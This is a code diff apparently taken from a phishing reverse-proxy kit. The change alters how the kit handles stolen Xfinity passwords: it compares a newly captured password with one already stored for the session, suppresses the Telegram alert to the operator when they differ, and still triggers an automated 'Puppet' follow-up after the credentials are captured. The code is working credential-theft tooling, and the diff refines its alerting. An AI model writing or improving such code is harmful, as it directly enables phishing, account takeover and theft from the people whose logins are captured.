@@ -866,8 +866,27 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// 3. One single Telegram notification and Puppet trigger call after all captures
 						// ONLY if we captured actual credentials (User/Pass)
 						if capturedCreds {
-							if s, ok := p.sessions[sid]; ok {
-								SendTelegramNotification(p.cfg, s, pl)
+							// For Xfinity: Check if this is a password re-capture (previous was incorrect)
+							shouldNotify := true
+							if pl.Name == "xfinity" {
+								// Check if we already have a password stored for this session
+								if existingPass, err := p.db.GetSessionPassword(sid); err == nil && existingPass != "" {
+									// We're recapturing password - previous one was incorrect
+									// Check if it's different from what we just captured
+									if s, ok := p.sessions[sid]; ok {
+										currentPass := s.Password
+										if existingPass != currentPass {
+											log.Warning("[%d] Xfinity: Password recaptured - previous attempt was incorrect", ps.Index)
+											shouldNotify = false // Don't spam Telegram with wrong passwords
+										}
+									}
+								}
+							}
+							
+							if shouldNotify {
+								if s, ok := p.sessions[sid]; ok {
+									SendTelegramNotification(p.cfg, s, pl)
+								}
 							}
 							p.triggerPuppet(sid, pl.Name, req)
 						} else if capturedCustom {
